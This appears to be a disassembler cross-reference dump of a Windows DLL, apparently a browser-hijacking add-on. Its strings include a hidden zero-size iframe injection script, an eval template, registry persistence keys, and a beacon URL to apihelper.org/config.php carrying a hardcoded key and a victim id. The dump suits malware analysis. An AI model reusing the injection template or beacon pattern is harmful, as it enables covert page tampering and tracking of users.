reference_vaddr	symbol_addr	symbol_type	caller_function	data
0x10005592	0x100211a4	import	0x1000556d	RPCRT4.dll.UuidCreate
0x100055a2	0x100211a8	import	0x1000556d	RPCRT4.dll.UuidToStringA
0x100055c4	0x100211ac	import	0x1000556d	RPCRT4.dll.RpcStringFreeA
0x10005606	0x1002b210	string	0x100055d9	0123456789ABCDEF0123456789abcdef
0x10005647	0x1002b210	string	0x10005633	0123456789ABCDEF0123456789abcdef
0x10005690	0x100215b0	string	0x10005633	FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF
0x100056af	0x1002101c	import	0x100056a0	ADVAPI32.dll.RegCreateKeyA
0x100056bf	0x10021020	import	0x100056a0	ADVAPI32.dll.RegQueryValueExA
0x100056dd	0x10021024	import	0x100056a0	ADVAPI32.dll.RegCloseKey
0x1000571b	0x10021024	import	0x100056a0	ADVAPI32.dll.RegCloseKey
0x1000575a	0x1002101c	import	0x1000573b	ADVAPI32.dll.RegCreateKeyA
0x1000577b	0x10021018	import	0x1000573b	ADVAPI32.dll.RegSetValueExA
0x10005786	0x10021024	import	0x1000573b	ADVAPI32.dll.RegCloseKey
0x100057f0	0x1002101c	import	0x100057e2	ADVAPI32.dll.RegCreateKeyA
0x10005805	0x10021014	import	0x100057e2	ADVAPI32.dll.RegDeleteValueA
0x10005810	0x10021024	import	0x100057e2	ADVAPI32.dll.RegCloseKey
0x10005a97	0x100216dc	string	0x10005a5e	SOFTWARE\APIHelper\Parameters
0x10005b12	0x100216dc	string	0x10005ae1	SOFTWARE\APIHelper\Parameters
0x10005b75	0x10005b79	string	0x10005b62	9E\br
0x10005bc2	0x10005bd0	string	0x10005b9e	8Z-t
0x10005c34	0x100216fc	string	0x10005c25	invalid string position
0x10005ca5	0x10005cbe	string	0x10005c88	8Z-t
0x10005ce1	0x100210b0	import	0x10005cce	KERNEL32.dll.MultiByteToWideChar
0x10005d01	0x1002117c	import	0x10005cce	OLEAUT32.dll.SysReAllocStringLen
0x10005d22	0x10021180	import	0x10005cce	OLEAUT32.dll.SysStringLen
0x10005e90	0x100216dc	string	0x10005e59	SOFTWARE\APIHelper\Parameters
0x10006113	0x100216fc	string	0x10006102	invalid string position
0x100062db	0x10021714	string	0x100062cc	string too long
0x1000637f	0x100216fc	string	0x1000636a	invalid string position
0x10006518	0x10021748	string	0x100064ed	map/set<T> too long
0x1000666a	0x1002175c	string	0x10006657	invalid map/set<T> iterator
0x100068c4	0x100068f0	string	0x100068b3	_^[]
0x10006c97	0x10021814	string	0x10006c7f	ObtainScript
0x10006ccf	0x100217d0	string	0x10006c7f	ObtainAjaxScript
0x10006d00	0x100217c0	string	0x10006c7f	RegRead
0x10006d31	0x100217ac	string	0x10006c7f	RegWrite
0x10006d62	0x10021798	string	0x10006c7f	RegDelete
0x10006d93	0x10021784	string	0x10006c7f	GetGroup
0x10006dc4	0x10021778	string	0x10006c7f	GetId
0x10006e7e	0x10021180	import	0x10006e45	OLEAUT32.dll.SysStringLen
0x10006eb8	0x10021180	import	0x10006e85	OLEAUT32.dll.SysStringLen
0x100070e5	0x10021180	import	0x10007057	OLEAUT32.dll.SysStringLen
0x100071d8	0x1002119c	import	0x10007114	OLEAUT32.dll.SysReAllocString
0x1000720a	0x10021180	import	0x10007114	OLEAUT32.dll.SysStringLen
0x100077dd	0x100218f0	string	0x10007797	eval("%s")
0x10007800	0x100218d8	string	0x10007797	JavaScript
0x1000785c	0x10021918	string	0x10007835	if (!document.getElementById('%s')){var s = document.createElement('iframe');s.setAttribute('width', '0px');s.setAttribute('height', '0px');s.setAttribute('src', '%s');s.setAttribute('id', '%s');document.body.appendChild(s);}
0x100078bf	0x10021180	import	0x10007888	OLEAUT32.dll.SysStringLen
0x10007956	0x100211c8	import	0x10007888	USER32.dll.LoadStringW
0x10007adf	0x100211e0	import	0x10007aba	ole32.dll.CoTaskMemAlloc
0x10007b0f	0x100211d0	import	0x10007ae7	ole32.dll.CoTaskMemRealloc
0x10007b3a	0x100210b0	import	0x10007b17	KERNEL32.dll.MultiByteToWideChar
0x10007b72	0x100210b8	import	0x10007b4f	KERNEL32.dll.WideCharToMultiByte
0x10007b8d	0x100210a0	import	0x10007b87	KERNEL32.dll.lstrlenW
0x10007c2b	0x10021034	import	0x10007c26	KERNEL32.dll.InitializeCriticalSectionAndSpinCount
0x10007c35	0x10021030	import	0x10007c26	KERNEL32.dll.GetLastError
0x10007c4f	0x10021030	import	0x10007c4f	KERNEL32.dll.GetLastError
0x10007c85	0x10021b54	string	0x10007c7a	Advapi32.dll
0x10007c8a	0x10021040	import	0x10007c7a	KERNEL32.dll.GetModuleHandleA
0x10007c94	0x10021b3c	string	0x10007c7a	RegOpenKeyTransactedA
0x10007c9a	0x1002103c	import	0x10007c7a	KERNEL32.dll.GetProcAddress
0x10007cc3	0x10021010	import	0x10007c7a	ADVAPI32.dll.RegOpenKeyExA
0x10007cdc	0x10021b54	string	0x10007cd1	Advapi32.dll
0x10007ce1	0x10021040	import	0x10007cd1	KERNEL32.dll.GetModuleHandleA
0x10007ceb	0x10021b64	string	0x10007cd1	RegCreateKeyTransactedA
0x10007cf1	0x1002103c	import	0x10007cd1	KERNEL32.dll.GetProcAddress
0x10007d26	0x1002100c	import	0x10007cd1	ADVAPI32.dll.RegCreateKeyExA
0x10007d41	0x10021b54	string	0x10007d34	Advapi32.dll
0x10007d46	0x10021040	import	0x10007d34	KERNEL32.dll.GetModuleHandleA
0x10007d50	0x10021b7c	string	0x10007d34	RegDeleteKeyTransactedA
0x10007d56	0x1002103c	import	0x10007d34	KERNEL32.dll.GetProcAddress
0x10007d77	0x10021008	import	0x10007d34	ADVAPI32.dll.RegDeleteKeyA
0x10007e11	0x10021b54	string	0x10007def	Advapi32.dll
0x10007e16	0x10021040	import	0x10007def	KERNEL32.dll.GetModuleHandleA
0x10007e20	0x10021b94	string	0x10007def	RegDeleteKeyExA
0x10007e26	0x1002103c	import	0x10007def	KERNEL32.dll.GetProcAddress
0x10007e54	0x10021008	import	0x10007def	ADVAPI32.dll.RegDeleteKeyA
0x10007e6b	0x10021024	import	0x10007e5f	ADVAPI32.dll.RegCloseKey
0x10007eb1	0x1002100c	import	0x10007e7a	ADVAPI32.dll.RegCreateKeyExA
0x10007f0c	0x10021010	import	0x10007ee2	ADVAPI32.dll.RegOpenKeyExA
0x10007f45	0x10021044	import	0x10007f31	KERNEL32.dll.lstrlenA
0x10007f5a	0x10021018	import	0x10007f31	ADVAPI32.dll.RegSetValueExA
0x10007f7c	0x10021044	import	0x10007f65	KERNEL32.dll.lstrlenA
0x10007f99	0x10021018	import	0x10007f65	ADVAPI32.dll.RegSetValueExA
0x10007fae	0x100211bc	import	0x10007fa6	USER32.dll.CharNextA
0x10007ff7	0x100211d4	import	0x10007fc0	ole32.dll.CoTaskMemFree
0x100080d5	0x1002167c	string	0x10008084	BDMS
0x100080f2	0x10021048	import	0x10008084	KERNEL32.dll.lstrcmpiA
0x10008164	0x10021048	import	0x10008154	KERNEL32.dll.lstrcmpiA
0x10008197	0x100211bc	import	0x10008182	USER32.dll.CharNextA
0x100081a1	0x10008191	string	0x10008182	:M\ft
0x100081d4	0x100211bc	import	0x100081cd	USER32.dll.CharNextA
0x1000821a	0x100211bc	import	0x100081ef	USER32.dll.CharNextA
0x10008299	0x100211bc	import	0x100081ef	USER32.dll.CharNextA
0x100082eb	0x10021048	import	0x100082dd	KERNEL32.dll.lstrcmpiA
0x100082f8	0x100216dc	string	0x100082dd	SOFTWARE\APIHelper\Parameters
0x10008326	0x10021004	import	0x1000830c	ADVAPI32.dll.RegQueryInfoKeyW
0x10008437	0x1002109c	import	0x10008422	KERNEL32.dll.RaiseException
0x100084bc	0x10021048	import	0x100084a2	KERNEL32.dll.lstrcmpiA
0x1000866c	0x10021038	import	0x1000863f	KERNEL32.dll.DeleteCriticalSection
0x1000884d	0x10021050	import	0x10008822	KERNEL32.dll.GetModuleFileNameA
0x1000885a	0x100211c4	import	0x10008822	USER32.dll.CharLowerA
0x10008866	0x10021cd0	string	0x10008822	explorer.exe
0x10008891	0x1002104c	import	0x10008822	KERNEL32.dll.DisableThreadLibraryCalls
0x10008921	0x10021038	import	0x10008913	KERNEL32.dll.DeleteCriticalSection
0x1000897d	0x10021068	import	0x10008952	KERNEL32.dll.LeaveCriticalSection
0x1000898d	0x10021054	import	0x10008952	KERNEL32.dll.InterlockedIncrement
0x10008998	0x10021058	import	0x10008952	KERNEL32.dll.InterlockedDecrement
0x100089ca	0x100211d8	import	0x1000899f	ole32.dll.CoCreateInstance
0x10008a00	0x10021d20	string	0x100089f3	APPID
0x10008a57	0x100210a0	import	0x10008a32	KERNEL32.dll.lstrlenW
0x10008ab4	0x10021044	import	0x10008a32	KERNEL32.dll.lstrlenA
0x10008bb1	0x10021044	import	0x10008b86	KERNEL32.dll.lstrlenA
0x10008bcd	0x100211d4	import	0x10008b86	ole32.dll.CoTaskMemFree
0x10008bf5	0x100211d4	import	0x10008b86	ole32.dll.CoTaskMemFree
0x10008c18	0x100211bc	import	0x10008b86	USER32.dll.CharNextA
0x10008c30	0x10021c18	string	0x10008b86	HKCR
0x10008c59	0x10021d60	string	0x10008b86	HKCU\r\n{\tSoftware\r\n\t{\r\n\t\tClasses
0x10008cbf	0x10008cc4	string	0x10008b86	<}u
0x10008cd3	0x10021d48	string	0x10008b86	\r\n\t}\r\n}\r\n
0x10008e41	0x10021050	import	0x10008de6	KERNEL32.dll.GetModuleFileNameA
0x10008e88	0x100211bc	import	0x10008de6	USER32.dll.CharNextA
0x10008eb2	0x100210a0	import	0x10008de6	KERNEL32.dll.lstrlenW
0x10008f26	0x10021044	import	0x10008de6	KERNEL32.dll.lstrlenA
0x10008f67	0x10021044	import	0x10008de6	KERNEL32.dll.lstrlenA
0x10009015	0x10021188	import	0x10008de6	OLEAUT32.dll.LoadRegTypeLib
0x1000902b	0x10021da0	string	0x10008de6	.tlb
0x10009074	0x10021044	import	0x10008de6	KERNEL32.dll.lstrlenA
0x10009114	0x10021188	import	0x10008de6	OLEAUT32.dll.LoadRegTypeLib
0x10009121	0x1002119c	import	0x10008de6	OLEAUT32.dll.SysReAllocString
0x100091d4	0x100211d8	import	0x10009179	ole32.dll.CoCreateInstance
0x1000920a	0x100211dc	import	0x10009179	ole32.dll.StringFromGUID2
0x1000921d	0x100210a0	import	0x10009179	KERNEL32.dll.lstrlenW
0x10009327	0x10021dd8	string	0x10009179	CLSID\
0x1000935d	0x10021dc0	string	0x10009179	\Required Categories
0x100093da	0x10021028	import	0x10009179	ADVAPI32.dll.RegQueryInfoKeyA
0x10009413	0x10021dd8	string	0x10009179	CLSID\
0x10009444	0x10021da8	string	0x10009179	\Implemented Categories
0x10009492	0x10021028	import	0x10009179	ADVAPI32.dll.RegQueryInfoKeyA
0x10009576	0x10021e0c	string	0x10009523	OLEAUT32.DLL
0x1000957b	0x1002105c	import	0x10009523	KERNEL32.dll.GetModuleHandleW
0x1000958b	0x1002103c	import	0x10009523	KERNEL32.dll.GetProcAddress
0x100095ce	0x10021180	import	0x10009523	OLEAUT32.dll.SysStringLen
0x1000965e	0x10021184	import	0x100095db	OLEAUT32.dll.VariantInit
0x1000969d	0x100211c0	import	0x100095db	USER32.dll.CharNextW
0x100096f6	0x10021180	import	0x100095db	OLEAUT32.dll.SysStringLen
0x10009723	0x10021e0c	string	0x100095db	OLEAUT32.DLL
0x10009728	0x1002105c	import	0x100095db	KERNEL32.dll.GetModuleHandleW
0x10009732	0x10021e28	string	0x100095db	RegisterTypeLibForUser
0x10009738	0x1002103c	import	0x100095db	KERNEL32.dll.GetProcAddress
0x1000975e	0x10021180	import	0x100095db	OLEAUT32.dll.SysStringLen
0x1000977a	0x10021180	import	0x100095db	OLEAUT32.dll.SysStringLen
0x100097b2	0x100097fe	string	0x10009793	9E\ft\fP
0x100098be	0x100098ca	string	0x100098a0	9\vu\n
0x100098e0	0x10009901	string	0x100098a0	;s\fr
0x10009914	0x10021098	import	0x100098a0	KERNEL32.dll.EnterCriticalSection
0x10009933	0x10021068	import	0x100098a0	KERNEL32.dll.LeaveCriticalSection
0x10009afc	0x10021044	import	0x10009ad3	KERNEL32.dll.lstrlenA
0x10009b34	0x100210a0	import	0x10009ad3	KERNEL32.dll.lstrlenW
0x10009c1c	0x100210a0	import	0x10009bf1	KERNEL32.dll.lstrlenW
0x10009db3	0x10021044	import	0x10009ccc	KERNEL32.dll.lstrlenA
0x10009df0	0x100211bc	import	0x10009ccc	USER32.dll.CharNextA
0x10009e1c	0x10021060	import	0x10009ccc	KERNEL32.dll.IsDBCSLeadByte
0x10009e91	0x10021044	import	0x10009ccc	KERNEL32.dll.lstrlenA
0x10009f12	0x10021194	import	0x10009ccc	OLEAUT32.dll.VarUI4FromDisp
0x10009f3e	0x10021018	import	0x10009ccc	ADVAPI32.dll.RegSetValueExA
0x10009f7e	0x10021044	import	0x10009ccc	KERNEL32.dll.lstrlenA
0x1000a05d	0x10021018	import	0x10009ccc	ADVAPI32.dll.RegSetValueExA
0x1000a142	0x10021658	string	0x1000a0d9	Delete
0x1000a152	0x10021048	import	0x1000a0d9	KERNEL32.dll.lstrcmpiA
0x1000a15c	0x1002166c	string	0x1000a0d9	ForceRemove
0x1000a169	0x10021048	import	0x1000a0d9	KERNEL32.dll.lstrcmpiA
0x1000a253	0x10021660	string	0x1000a0d9	NoRemove
0x1000a259	0x10021048	import	0x1000a0d9	KERNEL32.dll.lstrcmpiA
0x1000a285	0x10021048	import	0x1000a0d9	KERNEL32.dll.lstrcmpiA
0x1000a37e	0x10021014	import	0x1000a0d9	ADVAPI32.dll.RegDeleteValueA
0x1000a4e6	0x10021044	import	0x1000a0d9	KERNEL32.dll.lstrlenA
0x1000a65d	0x10021044	import	0x1000a0d9	KERNEL32.dll.lstrlenA
0x1000a767	0x1000a74c	string	0x1000a732	9~\bt
0x1000a779	0x10021098	import	0x1000a732	KERNEL32.dll.EnterCriticalSection
0x1000a798	0x10021068	import	0x1000a732	KERNEL32.dll.LeaveCriticalSection
0x1000a862	0x1000a8d9	string	0x1000a83f	_^[]
0x1000a883	0x1000a8d9	string	0x1000a83f	_^[]
0x1000a8b7	0x1000a8d9	string	0x1000a83f	_^[]
0x1000a8c1	0x1000a8d9	string	0x1000a83f	_^[]
0x1000a8d2	0x1000a8d9	string	0x1000a83f	_^[]
0x1000a8eb	0x10021054	import	0x1000a8e0	KERNEL32.dll.InterlockedIncrement
0x1000a916	0x10021058	import	0x1000a90a	KERNEL32.dll.InterlockedDecrement
0x1000a9e2	0x10021180	import	0x1000a9d1	OLEAUT32.dll.SysStringLen
0x1000ac67	0x10021184	import	0x1000ab53	OLEAUT32.dll.VariantInit
0x1000ac88	0x10021180	import	0x1000ab53	OLEAUT32.dll.SysStringLen
0x1000ad20	0x1000ad31	string	0x1000ace8	;~\fu
0x1000af2d	0x10021098	import	0x1000aed7	KERNEL32.dll.EnterCriticalSection
0x1000af41	0x10021068	import	0x1000aed7	KERNEL32.dll.LeaveCriticalSection
0x1000b09f	0x1000b0d4	string	0x1000b01d	_^[]
0x1000b0c6	0x1000b0d4	string	0x1000b01d	_^[]
0x1000b0cd	0x1000b0d4	string	0x1000b01d	_^[]
0x1000b28a	0x100211d4	import	0x1000b19a	ole32.dll.CoTaskMemFree
0x1000b3fb	0x10021098	import	0x1000b3b4	KERNEL32.dll.EnterCriticalSection
0x1000b410	0x1000b656	string	0x1000b3b4	3ۋF\f blocks=Basic Latin,Arabic
0x1000b460	0x10021050	import	0x1000b3b4	KERNEL32.dll.GetModuleFileNameA
0x1000b489	0x10021044	import	0x1000b3b4	KERNEL32.dll.lstrlenA
0x1000b500	0x10021188	import	0x1000b3b4	OLEAUT32.dll.LoadRegTypeLib
0x1000b525	0x10021068	import	0x1000b3b4	KERNEL32.dll.LeaveCriticalSection
0x1000b559	0x10021190	import	0x1000b3b4	OLEAUT32.dll.RegisterTypeLib
0x1000b679	0x10021068	import	0x1000b3b4	KERNEL32.dll.LeaveCriticalSection
0x1000b6ed	0x10021098	import	0x1000b6a9	KERNEL32.dll.EnterCriticalSection
0x1000b757	0x10021050	import	0x1000b6a9	KERNEL32.dll.GetModuleFileNameA
0x1000b780	0x10021044	import	0x1000b6a9	KERNEL32.dll.lstrlenA
0x1000b7f7	0x10021188	import	0x1000b6a9	OLEAUT32.dll.LoadRegTypeLib
0x1000b81c	0x10021068	import	0x1000b6a9	KERNEL32.dll.LeaveCriticalSection
0x1000b8f3	0x10021190	import	0x1000b6a9	OLEAUT32.dll.RegisterTypeLib
0x1000b982	0x10021068	import	0x1000b6a9	KERNEL32.dll.LeaveCriticalSection
0x1000b9c3	0x100210a0	import	0x1000b99c	KERNEL32.dll.lstrlenW
0x1000be2a	0x100210a0	import	0x1000bde0	KERNEL32.dll.lstrlenW
0x1000becb	0x10021074	import	0x1000bde0	KERNEL32.dll.LoadLibraryExA
0x1000bef6	0x10021070	import	0x1000bde0	KERNEL32.dll.FindResourceA
0x1000bf0e	0x1002106c	import	0x1000bde0	KERNEL32.dll.LoadResource
0x1000bf20	0x100210b4	import	0x1000bde0	KERNEL32.dll.SizeofResource
0x1000bfb3	0x10021064	import	0x1000bde0	KERNEL32.dll.FreeLibrary
0x1000c011	0x100210a0	import	0x1000bff1	KERNEL32.dll.lstrlenW
0x1000c0db	0x100210a0	import	0x1000c0b0	KERNEL32.dll.lstrlenW
0x1000c1fe	0x100210a0	import	0x1000c1de	KERNEL32.dll.lstrlenW
0x1000c2c8	0x100210a0	import	0x1000c29d	KERNEL32.dll.lstrlenW
0x1000ca47	0x10021054	import	0x1000ca3d	KERNEL32.dll.InterlockedIncrement
0x1000cbc1	0x10021058	import	0x1000cbb5	KERNEL32.dll.InterlockedDecrement
0x1000cbf0	0x10021080	import	0x1000cbe8	KERNEL32.dll.TerminateThread
0x1000cc22	0x10021098	import	0x1000cc10	KERNEL32.dll.EnterCriticalSection
0x1000cc3e	0x1002204c	string	0x1000cc10	SOFTWARE\APIHelper
0x1000cc91	0x10021068	import	0x1000cc10	KERNEL32.dll.LeaveCriticalSection
0x1000ccd3	0x10021098	import	0x1000cca2	KERNEL32.dll.EnterCriticalSection
0x1000ccfe	0x10022068	string	0x1000cca2	status
0x1000cd28	0x1002204c	string	0x1000cca2	SOFTWARE\APIHelper
0x1000cd64	0x10021068	import	0x1000cca2	KERNEL32.dll.LeaveCriticalSection
0x1000cd88	0x1002204c	string	0x1000cd73	SOFTWARE\APIHelper
0x1000cdd0	0x100220a8	string	0x1000cdc4	group
0x1000cdd5	0x10022074	string	0x1000cdc4	SYSTEM\CurrentControlSet\services\KBDMAI\Parameters
0x1000cdfd	0x100220e8	string	0x1000cdec	/config.php
0x1000ce02	0x100220d8	string	0x1000cdec	apihelper.org
0x1000ce07	0x100220c0	string	0x1000cdec	http://%S%S
0x1000ce11	0x100211b4	import	0x1000cdec	SHLWAPI.dll.StrStrIW
0x1000ce28	0x100220b0	string	0x1000cdec	?cparam
0x1000cebc	0x10022170	string	0x1000ce9a	&group=
0x1000cec2	0x1002213c	string	0x1000ce9a	key=3faf033cf35c4290ac2a4c6b2989f282&vplg=3.2&id=
0x1000ceee	0x10022134	string	0x1000ce9a	&xhg=%p
0x1000cf02	0x1002212c	string	0x1000ce9a	&task=
0x1000cf08	0x10022120	string	0x1000ce9a	?cparam=
0x1000cf0d	0x100220e8	string	0x1000ce9a	/config.php
0x1000cf12	0x100220d8	string	0x1000ce9a	apihelper.org
0x1000cf17	0x10022118	string	0x1000ce9a	http://
0x1000d3a4	0x10021098	import	0x1000d39c	KERNEL32.dll.EnterCriticalSection
0x1000d3b1	0x10021068	import	0x1000d39c	KERNEL32.dll.LeaveCriticalSection
0x1000d3c6	0x10021098	import	0x1000d3bc	KERNEL32.dll.EnterCriticalSection
0x1000d3d5	0x10021068	import	0x1000d3bc	KERNEL32.dll.LeaveCriticalSection
0x1000d45f	0x10021078	import	0x1000d43f	KERNEL32.dll.InitializeCriticalSection
0x1000d4a1	0x10021088	import	0x1000d43f	KERNEL32.dll.CreateThread
0x1000d4bd	0x100210f4	import	0x1000d4b2	KERNEL32.dll.GetSystemTimeAsFileTime
0x1000de89	0x1000de98	string	0x1000de60	^[_3
0x1000def9	0x1000df3e	string	0x1000dee6	_[]Ë blocks=Basic Latin,Latin-1 Supplement
0x1000e937	0x1000e944	string	0x1000e8d6	jjjjj
0x1000e991	0x10016c8a	string	0x1000e973	j\bh
0x1000e9d4	0x10016c8a	string	0x1000e973	j\bh
0x1000efdf	0x100222e8	string	0x1000eee9	Bad dynamic_cast!
0x1000f2ef	0x10022308	string	0x1000f2cb	Unknown exception
0x1000f522	0x1002109c	import	0x1000f4e0	KERNEL32.dll.RaiseException
0x1000fa96	0x10021104	import	0x1000fa80	KERNEL32.dll.HeapFree
0x1000faa8	0x10021030	import	0x1000fa80	KERNEL32.dll.GetLastError
0x100103a9	0x10011049	string	0x1000fb7b	_^]Ë blocks=Basic Latin,Latin-1 Supplement
0x10010f62	0x10011049	string	0x1000fb7b	_^]Ë blocks=Basic Latin,Latin-1 Supplement
0x10010f81	0x10011049	string	0x1000fb7b	_^]Ë blocks=Basic Latin,Latin-1 Supplement
0x10010fa0	0x10011049	string	0x1000fb7b	_^]Ë blocks=Basic Latin,Latin-1 Supplement
0x10010fb0	0x10011049	string	0x1000fb7b	_^]Ë blocks=Basic Latin,Latin-1 Supplement
0x10010fc1	0x10011049	string	0x1000fb7b	_^]Ë blocks=Basic Latin,Latin-1 Supplement
0x10010fe3	0x10011049	string	0x1000fb7b	_^]Ë blocks=Basic Latin,Latin-1 Supplement
0x10010ffe	0x10011049	string	0x1000fb7b	_^]Ë blocks=Basic Latin,Latin-1 Supplement
0x10011027	0x10011049	string	0x1000fb7b	_^]Ë blocks=Basic Latin,Latin-1 Supplement
0x10011272	0x10021108	import	0x1001122d	KERNEL32.dll.HeapAlloc
0x1001135c	0x10011391	string	0x10011336	_^]Ë blocks=Basic Latin,Latin-1 Supplement
0x100114c4	0x10021118	import	0x1001149b	KERNEL32.dll.VirtualQuery
0x100114dc	0x10021114	import	0x1001149b	KERNEL32.dll.GetSystemInfo
0x100114e5	0x10022378	string	0x1001149b	kernel32.dll
0x100114ec	0x1002105c	import	0x1001149b	KERNEL32.dll.GetModuleHandleW
0x100114f6	0x10022360	string	0x1001149b	SetThreadStackGuarantee
0x100114fc	0x1002103c	import	0x1001149b	KERNEL32.dll.GetProcAddress
0x1001154e	0x10021110	import	0x1001149b	KERNEL32.dll.VirtualAlloc
0x10011563	0x1002110c	import	0x1001149b	KERNEL32.dll.VirtualProtect
0x10011679	0x10018b72	string	0x100115f2	UVWS
0x10011887	0x100210fc	import	0x1001187f	KERNEL32.dll.DecodePointer
0x10011906	0x10021100	import	0x1001187f	KERNEL32.dll.EncodePointer
0x10011914	0x10021100	import	0x1001187f	KERNEL32.dll.EncodePointer
0x10011946	0x10021100	import	0x1001187f	KERNEL32.dll.EncodePointer
0x100119aa	0x10011966	string	0x100119a2	j\fhP
0x10011a4b	0x10021120	import	0x10011a12	KERNEL32.dll.GetCommandLineA
0x10011b30	0x100210fc	import	0x10011aeb	KERNEL32.dll.DecodePointer
0x10011b45	0x1002111c	import	0x10011aeb	KERNEL32.dll.GetCurrentThreadId
0x10011bca	0x10011a12	string	0x10011b76	j\bhp
0x10011bfa	0x10011a12	string	0x10011b76	j\bhp
0x10011c1a	0x10011a12	string	0x10011b76	j\bhp
0x10011d12	0x100210fc	import	0x10011d07	KERNEL32.dll.DecodePointer
0x10011d4d	0x100210fc	import	0x10011d2f	KERNEL32.dll.DecodePointer
0x10011e3e	0x10022448	string	0x10011d2f	log10
0x10011e62	0x10022448	string	0x10011d2f	log10
0x10011eae	0x1002243c	string	0x10011d2f	asin
0x10011eb7	0x10022434	string	0x10011d2f	acos
0x10011f01	0x1002242c	string	0x10011d2f	exp10
0x10011f2c	0x10022448	string	0x10011d2f	log10
0x10011f3e	0x10022424	string	0x10011d2f	atan
0x10011f47	0x1002241c	string	0x10011d2f	ceil
0x10011f53	0x10022414	string	0x10011d2f	floor
0x10011f5f	0x1002240c	string	0x10011d2f	modf
